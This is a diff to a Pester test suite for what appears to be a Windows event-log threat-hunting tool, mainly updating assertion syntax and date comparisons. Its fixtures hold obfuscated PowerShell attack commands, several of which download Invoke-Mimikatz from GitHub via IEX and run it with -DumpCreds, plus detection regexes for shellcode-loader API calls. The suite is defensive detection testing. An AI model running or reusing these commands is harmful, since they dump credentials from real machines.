@@ -46,7 +46,7 @@ Describe 'Testing Sample EVTX files' {
             $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Command','Decoded') } | Select-Object -Expand Name
             $ar = @(
                 [PSCustomObject]@{
-                    Date    = [datetime]636920030913739486
+                    Date    = [datetime]636919958913739486
                     Log     = 'System'
                     EventID = [int]7040
                     Message = 'Event Log Service Stopped'
@@ -69,12 +69,13 @@ Describe 'Testing Sample EVTX files' {
                 $p = $_
                 if ($p -eq 'Date') {
                  It "Test result $($i) $($p)" {
-                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date.ToUniversalTime()) -Property $p)| Should Be $true
+                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
                  }
-
+                # Write-Verbose -Message "From evtx $($o.Date)" -Verbose
+                # Write-Verbose -Message "From fake ar $($ar[$i].Date)" -Verbose
                 } else {
                  It "Test result $($i) $($p)" {
-                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should Be $true
+                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
                  }
                 }
             }
@@ -98,16 +99,19 @@ Describe 'Testing Sample EVTX files' {
         }
         $props |
         ForEach-Object {
-            $p = $_
-            if ($p -eq 'Date') {
-             It "Test result 1 $($p)" {
-                $null -eq (Compare-Object -ReferenceObject ($r[0].Date.ToUniversalTime()) -DifferenceObject ($exr.Date.ToUniversalTime()) -Property $p)| Should Be $true
-             }
-            } else {
-             It "Test result 1 $($p)" {
-                $null -eq (Compare-Object -ReferenceObject ($r[0]) -DifferenceObject ($exr) -Property $p)| Should Be $true
-             }
+                $p = $_
+                if ($p -eq 'Date') {
+                 # Write-Verbose -Message "From evtx $($o.Date)" -Verbose
+                 # Write-Verbose -Message "From fake ar $($ar[$i].Date)" -Verbose
+            It "Test result 1 $($p)" {
+                $null -eq (Compare-Object -ReferenceObject ($r[0].Date.ToUniversalTime()) -DifferenceObject ($exr.Date) -Property $p)| Should -Be $true
             }
+
+                } else {
+            It "Test result 1 $($p)" {
+                $null -eq (Compare-Object -ReferenceObject ($r[0]) -DifferenceObject ($exr) -Property $p)| Should -Be $true
+            }
+                }
         }
     }
     Context 'metasploit-psexec-native-target-system' {
@@ -169,8 +173,15 @@ Describe 'Testing Sample EVTX files' {
             $props |
             ForEach-Object {
                 $p = $_
-                It "Test result $($i) $($p)" {
-                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should Be $true
+                if ($p -eq 'Date') {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
+                 }
+
+                } else {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
+                 }
                 }
             }
             $i++
@@ -221,8 +232,15 @@ Describe 'Testing Sample EVTX files' {
             $props |
             ForEach-Object {
                 $p = $_
-                It "Test result $($i) $($p)" {
-                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should Be $true
+                if ($p -eq 'Date') {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
+                 }
+
+                } else {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
+                 }
                 }
             }
             $i++
@@ -231,10 +249,10 @@ Describe 'Testing Sample EVTX files' {
         $r | Select-Object -Skip 1 | ForEach-Object {
             $o = $_
             It "Test result $($i) Command" {
-                $o.Command -match 'powershell\.exe'| Should Be $true
+                $o.Command -match 'powershell\.exe'| Should -Be $true
             }
             It "Test result $($i) Decoded" {
-                $o.Decoded -match '\[AppDomain\]::'| Should Be $true
+                $o.Decoded -match '\[AppDomain\]::'| Should -Be $true
             }
 
             $i++
@@ -283,8 +301,15 @@ Describe 'Testing Sample EVTX files' {
             $props |
             ForEach-Object {
                 $p = $_
-                It "Test result $($i) $($p)" {
-                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should Be $true
+                if ($p -eq 'Date') {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
+                 }
+
+                } else {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
+                 }
                 }
             }
             $i++
@@ -293,29 +318,29 @@ Describe 'Testing Sample EVTX files' {
         $r | Select-Object -Skip 1 | ForEach-Object {
             $o = $_
             It "Test result $($i) Command" {
-                $o.Command -match 'powershell\.exe'| Should Be $true
+                $o.Command -match 'powershell\.exe'| Should -Be $true
             }
             It "Test result $($i) Decoded" {
-                $o.Decoded -match '\[AppDomain\]::'| Should Be $true
+                $o.Decoded -match '\[AppDomain\]::'| Should -Be $true
             }
             # [System.Convert]::FromBase64String
             It "Test result $($i) Decoded" {
-                $o.Decoded -match '\[System\.Convert\]::FromBase64String'| Should Be $true
+                $o.Decoded -match '\[System\.Convert\]::FromBase64String'| Should -Be $true
             }
             # GetMethod('GetProcAddress').Invoke
             It "Test result $($i) Decoded" {
-                $o.Decoded -match "GetMethod\('GetProcAddress'\)\.Invoke"| Should Be $true
+                $o.Decoded -match "GetMethod\('GetProcAddress'\)\.Invoke"| Should -Be $true
             }
             # kernel32.dll VirtualAlloc
             It "Test result $($i) Decoded" {
-                $o.Decoded -match 'kernel32\.dll\sVirtualAlloc'| Should Be $true
+                $o.Decoded -match 'kernel32\.dll\sVirtualAlloc'| Should -Be $true
             }
             # kernel32.dll CreateThread
             It "Test result $($i) Decoded" {
-                $o.Decoded -match 'kernel32\.dll\sCreateThread'| Should Be $true
+                $o.Decoded -match 'kernel32\.dll\sCreateThread'| Should -Be $true
             }
             It "Test result $($i) Decoded" {
-                $o.Decoded -match '\[System.RunTime\.'| Should Be $true
+                $o.Decoded -match '\[System.RunTime\.'| Should -Be $true
             }
             $i++
         }
@@ -334,7 +359,7 @@ Describe 'Testing Sample EVTX files' {
                     Log='Security'
                     EventID=[int]4673
                     Message='Sensititive Privilege Use Exceeds Threshold'
-                    Results="Potentially indicative of Mimikatz, multiple sensitive privilege calls have been made.`r`nUsername: Sec504`r`nDomain Name: SEC504STUDENT"
+                    Results="Potentially indicative of Mimikatz, multiple sensitive privilege calls have been made.`nUsername: Sec504`nDomain Name: SEC504STUDENT"
                 }
             )
         }
@@ -344,8 +369,15 @@ Describe 'Testing Sample EVTX files' {
             $props |
             ForEach-Object {
                 $p = $_
-                It "Test result $($i) $($p)" {
-                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should Be $true
+                if ($p -eq 'Date') {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
+                 }
+
+                } else {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
+                 }
                 }
             }
             $i++
@@ -365,14 +397,14 @@ Describe 'Testing Sample EVTX files' {
                     Log='Security'
                     EventID=[int]4732
                     Message=''
-                    Results="Username: -`r`nUser SID: S-1-5-21-3463664321-2923530833-3546627382-1000"
+                    Results="Username: -`nUser SID: S-1-5-21-3463664321-2923530833-3546627382-1000"
                 },
                 [PSCustomObject]@{
                     Date=[datetime]635181493599735000 # 2013-10-23 18:22:39Z
                     Log='Security'
                     EventID=[int]4720
                     Message='New User Created'
-                    Results="Username: IEUser`r`nUser SID: S-1-5-21-3463664321-2923530833-3546627382-1000"
+                    Results="Username: IEUser`nUser SID: S-1-5-21-3463664321-2923530833-3546627382-1000"
                 }
             )
         }
@@ -382,8 +414,15 @@ Describe 'Testing Sample EVTX files' {
             $props |
             ForEach-Object {
                 $p = $_
-                It "Test result $($i) $($p)" {
-                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should Be $true
+                if ($p -eq 'Date') {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
+                 }
+
+                } else {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
+                 }
                 }
             }
             $i++
@@ -407,7 +446,7 @@ Describe 'Testing Sample EVTX files' {
                     Log='Powershell'
                     EventID=[int]4104
                     Message='Suspicious Command Line'
-                    Results="Long Command Line: greater than 1000 bytes`nPossible command obfuscation: only 3 % alphanumeric and common symbols`n"
+                    Results="Long Command Line: greater than 1000 bytes`nPossible command obfuscation: only 3% alphanumeric and common symbols`n"
                     Command='${=}  =+  $(  );  ${-#}  =${=}  ;${]!}  =++${=}  ;${*}  =++${=}  ;${(@}  =  ++${=}  ;${+=}=++  ${=};  ${%}  =  ++  ${=}  ;  ${.]/}  =  ++${=};${#/}=++${=}  ;  ${@=-}=  ++  ${=};  ${@%)}=  ++  ${=}  ;  ${*[%}  =  "["+"$(@{})"[${#/}  ]+"$(@{})"[  "${]!}"+"${@%)}"  ]+"$(@{  })"[  "${*}"  +  "${-#}"]  +  "$?  "[  ${]!}  ]+  "]"  ;${=}="".("$(  @{}  )"[  "${]!}${+=}"  ]+"$(  @{}  )"[  "${]!}${.]/}"]  +  "$(  @{})  "[  ${-#}  ]+  "$(@{  }  )  "[${+=}  ]+"$?  "[${]!}]  +  "$(  @{  }  )  "[  ${(@}  ]  )  ;${=}="$(@{  }  )  "[  "${]!}"  +"${+=}"  ]  +  "$(@{  }  )"[${+=}]  +  "${=}"[  "${*}"  +  "${#/}"  ]  ;  "  ${=}(${*[%}${#/}${(@}  +${*[%}${.]/}${@%)}+${*[%}${@=-}${@=-}  +${*[%}${(@}${*}  +${*[%}${+=}${-#}  +${*[%}${#/}${@=-}  +${*[%}${]!}${-#}${]!}+${*[%}${]!}${]!}${@%)}  +  ${*[%}${+=}${%}+  ${*[%}${#/}${@%)}  +  ${*[%}${@%)}${@=-}+${*[%}${]!}${-#}${.]/}+${*[%}${]!}${-#}${]!}  +${*[%}${@%)}${@%)}  +${*[%}${]!}${]!}${.]/}+  ${*[%}${(@}${*}  +${*[%}${#/}${@=-}+${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${.]/}  +${*[%}${+=}${.]/}+${*[%}${@=-}${#/}+${*[%}${]!}${-#}${]!}  +  ${*[%}${@%)}${@=-}+  ${*[%}${.]/}${#/}  +${*[%}${]!}${-#}${@=-}  +${*[%}${]!}${-#}${%}+${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${-#}  +  ${*[%}${]!}${]!}${.]/}+  ${*[%}${+=}${]!}  +  ${*[%}${+=}${.]/}+  ${*[%}${.]/}${@=-}+  ${*[%}${]!}${]!}${]!}+  ${*[%}${]!}${]!}${@%)}+  ${*[%}${]!}${]!}${-#}+${*[%}${]!}${-#}${@=-}  +${*[%}${]!}${]!}${]!}+  ${*[%}${@%)}${#/}  +  ${*[%}${]!}${-#}${-#}  +  ${*[%}${@=-}${(@}+  ${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${]!}${+=}+${*[%}${]!}${-#}${%}  +${*[%}${]!}${]!}${-#}+  ${*[%}${]!}${-#}${(@}+  ${*[%}${+=}${-#}+  ${*[%}${(@}${@%)}+${*[%}${]!}${-#}${+=}  +${*[%}${]!}${]!}${.]/}  +${*[%}${]!}${]!}${.]/}+  ${*[%}${]!}${]!}${*}  +${*[%}${]!}${]!}${%}  +  ${*[%}${%}${@=-}+  ${*[%}${+=}${#/}+${*[%}${+=}${#/}+${*[%}${]!}${]!}${+=}+  ${*[%}${@%)}${#/}+  ${*[%}${]!}${]!}${@%)}  +  ${*[%}${+=}${.]/}+${*[%}${]!}${-#}${(@}+${*[%}${]!}${-#}${%}+  ${*[%}${]!}${]!}${.]/}  +${*[%}${]!}${-#}${+=}  +${*[%}${]!}${]!}${#/}+${*[%}${@%)}${@=-}+${*[%}${]!}${]!}${#/}+${*[%}${]!}${]!}${%}  +  ${*[%}${]!}${-#}${]!}+  ${*[%}${]!}${]!}${+=}  +${*[%}${@%)}${@%)}+  ${*[%}${]!}${]!}${]!}  +  ${*[%}${]!}${]!}${-#}+${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${-#}+  ${*[%}${]!}${]!}${.]/}  +${*[%}${+=}${.]/}+  ${*[%}${@%)}${@%)}  +${*[%}${]!}${]!}${]!}  +${*[%}${]!}${-#}${@%)}  +${*[%}${+=}${#/}  +  ${*[%}${]!}${-#}${@%)}  +${*[%}${@%)}${#/}  +${*[%}${]!}${]!}${.]/}  +${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${-#}${%}  +  ${*[%}${]!}${-#}${*}  +${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${%}  +  ${*[%}${]!}${]!}${.]/}+${*[%}${@%)}${#/}+  ${*[%}${]!}${]!}${.]/}+  ${*[%}${]!}${-#}${%}+  ${*[%}${]!}${]!}${]!}  +${*[%}${]!}${]!}${-#}  +${*[%}${+=}${#/}+  ${*[%}${@=-}${-#}+${*[%}${]!}${]!}${]!}  +  ${*[%}${]!}${]!}${@%)}  +${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${+=}+  ${*[%}${@=-}${(@}+  ${*[%}${]!}${]!}${*}+${*[%}${]!}${-#}${@=-}+  ${*[%}${]!}${]!}${]!}+  ${*[%}${]!}${-#}${%}  +  ${*[%}${]!}${]!}${.]/}+${*[%}${+=}${#/}  +  ${*[%}${]!}${-#}${@%)}+  ${*[%}${@%)}${#/}  +${*[%}${]!}${]!}${%}  +${*[%}${]!}${]!}${.]/}+${*[%}${]!}${-#}${]!}  +${*[%}${]!}${]!}${+=}  +${*[%}${+=}${#/}+${*[%}${.]/}${@%)}+${*[%}${]!}${*}${-#}  +${*[%}${]!}${-#}${*}+  ${*[%}${]!}${-#}${%}+${*[%}${]!}${-#}${@=-}  +${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${]!}${+=}+  ${*[%}${@%)}${#/}+  ${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${-#}${%}  +  ${*[%}${]!}${]!}${]!}+${*[%}${]!}${]!}${-#}+${*[%}${+=}${#/}+${*[%}${#/}${(@}+  ${*[%}${]!}${]!}${-#}+${*[%}${]!}${]!}${@=-}+${*[%}${]!}${]!}${]!}+${*[%}${]!}${-#}${#/}  +${*[%}${]!}${-#}${]!}+${*[%}${+=}${%}+  ${*[%}${#/}${#/}+  ${*[%}${]!}${-#}${%}+${*[%}${]!}${-#}${@%)}+${*[%}${]!}${-#}${%}  +${*[%}${]!}${-#}${#/}+${*[%}${@%)}${#/}  +  ${*[%}${]!}${]!}${.]/}+${*[%}${]!}${*}${*}  +  ${*[%}${+=}${.]/}  +  ${*[%}${]!}${]!}${*}+${*[%}${]!}${]!}${%}  +  ${*[%}${+=}${@%)}+  ${*[%}${(@}${@%)}  +  ${*[%}${+=}${]!}  +${*[%}${%}${@%)}  +${*[%}${(@}${*}+  ${*[%}${#/}${(@}+${*[%}${]!}${]!}${-#}+${*[%}${]!}${]!}${@=-}+  ${*[%}${]!}${]!}${]!}+  ${*[%}${]!}${-#}${#/}+${*[%}${]!}${-#}${]!}+${*[%}${+=}${%}+  ${*[%}${#/}${#/}  +  ${*[%}${]!}${-#}${%}  +${*[%}${]!}${-#}${@%)}+${*[%}${]!}${-#}${%}+  ${*[%}${]!}${-#}${#/}  +  ${*[%}${@%)}${#/}+${*[%}${]!}${]!}${.]/}+${*[%}${]!}${*}${*}+${*[%}${(@}${*}  +  ${*[%}${+=}${%}  +${*[%}${.]/}${@=-}+${*[%}${]!}${]!}${#/}  +${*[%}${]!}${-#}${@%)}+  ${*[%}${]!}${]!}${*}  +${*[%}${.]/}${#/}+${*[%}${]!}${]!}${+=}  +${*[%}${]!}${-#}${]!}+${*[%}${]!}${-#}${-#}  +  ${*[%}${]!}${]!}${%})"|&  ${=}  '
                 },
                 [PSCustomObject]@{
@@ -428,8 +467,15 @@ Describe 'Testing Sample EVTX files' {
             $props |
             ForEach-Object {
                 $p = $_
-                It "Test result $($i) $($p)" {
-                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should Be $true
+                if ($p -eq 'Date') {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
+                 }
+
+                } else {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
+                 }
                 }
             }
             $i++
@@ -459,8 +505,15 @@ Describe 'Testing Sample EVTX files' {
             $props |
             ForEach-Object {
                 $p = $_
-                It "Test result $($i) $($p)" {
-                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should Be $true
+                if ($p -eq 'Date') {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
+                 }
+
+                } else {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
+                 }
                 }
             }
             $i++
@@ -477,7 +530,7 @@ Describe 'Testing Sample EVTX files' {
                 Log='Powershell'
                 EventID=[int]4104
                 Message='Suspicious Command Line'
-                Results="Possible command obfuscation: only 51 % alphanumeric and common symbols`nUse of PowerSploit`n"
+                Results="Possible command obfuscation: only 51% alphanumeric and common symbols`nUse of PowerSploit`n"
                 Command=@'
   & ( $psHOmE[21]+$PSHome[30]+'x') ( (('IE'+'X '+'(Ne'+'w-Obje'+'c'+'t Ne'+'t.We'+'bCli'+'ent'+').Dow'+'n'+'loadSt'+'ri'+'ng({0}https://raw.'+'github'+'userc'+'o'+'nt'+'ent.'+'com/'+'ma'+'ttif'+'e'+'stati'+'on/'+'PowerSploit'+'/m'+'aster'+'/E'+'xfi'+'ltr'+'at'+'i'+'on/Invoke-M'+'im'+'ikatz'+'.ps1'+'{0});'+' '+'Invok'+'e-'+'M'+'imi'+'katz '+'-DumpCreds')  -f [cHaR]39)) 
 '@
@@ -487,7 +540,7 @@ Describe 'Testing Sample EVTX files' {
                 Log='Powershell'
                 EventID=[int]4104
                 Message='Suspicious Command Line'
-                Results="Possible command obfuscation: only 53 % alphanumeric and common symbols`n"
+                Results="Possible command obfuscation: only 53% alphanumeric and common symbols`n"
                 Command=@'
 $l7i= " ))93]RaHc[ f-  )'sderCpmuD-'+' ztak'+'imi'+'M'+'-e'+'kovnI'+' '+';)}0{'+'1sp.'+'ztaki'+'mi'+'M-ekovnI/no'+'i'+'ta'+'rtl'+'ifx'+'E/'+'retsa'+'m/'+'tiolpSrewoP'+'/no'+'itats'+'e'+'fitt'+'am'+'/moc'+'.tne'+'tn'+'o'+'cresu'+'buhtig'+'.war//:sptth}0{(gn'+'ir'+'tSdaol'+'n'+'woD.)'+'tne'+'ilCb'+'eW.t'+'eN t'+'c'+'ejbO-w'+'eN('+' X'+'EI'(( ( )'x'+]03[emoHSP$+]12[EmOHsp$ ( &  ";  ( cHiLDiTEm  ("vAr"+"iaBlE"+":"+"l7I")).vaLuE[-1 ..-(( cHiLDiTEm  ("vAr"+"iaBlE"+":"+"l7I")).vaLuE.lengTh)]-JOIN''|& ( ([StRiNg]$VERbOsePREferENCe)[1,3]+'X'-join'')
 '@
@@ -497,7 +550,7 @@ $l7i= " ))93]RaHc[ f-  )'sderCpmuD-'+' ztak'+'imi'+'M'+'-e'+'kovnI'+' '+';)}0{'+
                 Log='Powershell'
                 EventID=[int]4104
                 Message='Suspicious Command Line'
-                Results="Possible command obfuscation: only 49 % alphanumeric and common symbols`n"
+                Results="Possible command obfuscation: only 49% alphanumeric and common symbols`n"
                 Command=@'
  ((("{41}{32}{44}{45}{20}{36}{35}{21}{10}{40}{29}{42}{26}{28}{1}{19}{15}{11}{48}{49}{39}{30}{4}{18}{47}{31}{24}{23}{33}{43}{12}{13}{7}{8}{22}{46}{14}{27}{25}{5}{0}{34}{6}{16}{17}{38}{3}{9}{2}{37}" -f'1','ubuserco','Dump','tz ','festati','atz.ps','); In','s','t','-','p','m/','/','ma','ion/I','co','vok','e-M','on','ntent.','load','t','er','l','p','e-Mimik','.','nvok','gith',':','ti','rS',' (New-','o','{0}','t','String({0}h','Creds','imika','t','s','IEX','//raw','it','Object Net.WebCli','ent).Down','/Exfiltrat','/Powe','m','a')) -F  [ChaR]39) | . ( $ShelliD[1]+$sHELliD[13]+'X')
 '@
@@ -507,7 +560,7 @@ $l7i= " ))93]RaHc[ f-  )'sderCpmuD-'+' ztak'+'imi'+'M'+'-e'+'kovnI'+' '+';)}0{'+
                 Log='Powershell'
                 EventID=[int]4104
                 Message='Suspicious Command Line'
-                Results="Possible command obfuscation: only 61 % alphanumeric and common symbols`n"
+                Results="Possible command obfuscation: only 61% alphanumeric and common symbols`n"
                 Command=@'
 (('IEX ('+'New'+'-Object'+' Net.Web'+'Client'+')'+'.DownloadString(oH'+'4http'+'s:'+'//raw'+'.g'+'it'+'hubuse'+'rcontent.c'+'om/m'+'at'+'tifes'+'t'+'a'+'tion/'+'Po'+'we'+'rSploit/ma'+'s'+'ter/Exfiltra'+'tion'+'/I'+'nvoke-Mimikat'+'z.ps1oH4'+'); Invoke-Mimi'+'katz -Du'+'mpCred'+'s') -REpLacE ([cHaR]111+[cHaR]72+[cHaR]52),[cHaR]39)| IEx
 '@
@@ -520,8 +573,19 @@ $l7i= " ))93]RaHc[ f-  )'sderCpmuD-'+' ztak'+'imi'+'M'+'-e'+'kovnI'+' '+';)}0{'+
             $props |
             ForEach-Object {
                 $p = $_
-                It "Test result $($i) $($p)" {
-                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should Be $true
+                # if ($p -eq 'Results') {
+                #    Write-Verbose -Message "$($ar[$i].$p.ToString() | Format-Hex)" -Verbose
+                #    Write-Verbose -Message "$($o.$p | Format-Hex)" -Verbose
+                # }
+                if ($p -eq 'Date') {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
+                 }
+
+                } else {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
+                 }
                 }
             }
             $i++
@@ -569,8 +633,15 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AU
             $props |
             ForEach-Object {
                 $p = $_
-                It "Test result $($i) $($p)" {
-                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should Be $true
+                if ($p -eq 'Date') {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
+                 }
+
+                } else {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
+                 }
                 }
             }
             $i++
@@ -579,28 +650,28 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AU
         $r | ForEach-Object {
             $o = $_
             It "Test result $($i) Command" {
-                $o.Command -match 'powershell\.exe'| Should Be $true
+                $o.Command -match 'powershell\.exe'| Should -Be $true
             }
             It "Test result $($i) Decoded" {
-                $o.Decoded -match 'New-Object'| Should Be $true
+                $o.Decoded -match 'New-Object'| Should -Be $true
             }
             It "Test result $($i) Decoded" {
-                $o.Decoded -match 'SyStEm\.NET\.WeBClIeNt'| Should Be $true
+                $o.Decoded -match 'SyStEm\.NET\.WeBClIeNt'| Should -Be $true
             }
             It "Test result $($i) Decoded" {
-                $o.Decoded -match 'https?://'| Should Be $true
+                $o.Decoded -match 'https?://'| Should -Be $true
             }
             It "Test result $($i) Decoded" {
-                $o.Decoded -match 'iex'| Should Be $true
+                $o.Decoded -match 'iex'| Should -Be $true
             }
             It "Test result $($i) Decoded" {
-                $o.Decoded -match '\[[cC][hH][aA][rR]\['| Should Be $true
+                $o.Decoded -match '\[[cC][hH][aA][rR]\['| Should -Be $true
             }
             It "Test result $($i) Decoded" {
-                $o.Decoded -match '\.DOwnloaDSTrING\('| Should Be $true
+                $o.Decoded -match '\.DOwnloaDSTrING\('| Should -Be $true
             }
             It "Test result $($i) Decoded" {
-                $o.Decoded -match '-[bB]?[x|X][oO][rR]'| Should Be $true
+                $o.Decoded -match '-[bB]?[x|X][oO][rR]'| Should -Be $true
             }
         }
     }
@@ -641,8 +712,15 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AU
             $props |
             ForEach-Object {
                 $p = $_
-                It "Test result $($i) $($p)" {
-                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should Be $true
+                if ($p -eq 'Date') {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
+                 }
+
+                } else {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
+                 }
                 }
             }
             $i++
@@ -651,13 +729,13 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AU
         $r | ForEach-Object {
             $o = $_
             It "Test result $($i) Command" {
-                $o.Command -match 'powershell\.exe'| Should Be $true
+                $o.Command -match 'powershell\.exe'| Should -Be $true
             }
             It "Test result $($i) Command" {
-                $o.Command -match "IEX\s\(New-Object\sNet\.WebClient\)\.DownloadString\('http"| Should Be $true
+                $o.Command -match "IEX\s\(New-Object\sNet\.WebClient\)\.DownloadString\('http"| Should -Be $true
             }
             It "Test result $($i) Command" {
-                $o.Command -match 'Mimikatz'| Should Be $true
+                $o.Command -match 'Mimikatz'| Should -Be $true
             }
         }
     }
@@ -739,8 +817,15 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AU
             $props |
             ForEach-Object {
                 $p = $_
-                It "Test result $($i) $($p)" {
-                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should Be $true
+                if ($p -eq 'Date') {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
+                 }
+
+                } else {
+                 It "Test result $($i) $($p)" {
+                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
+                 }
                 }
             }
             $i++
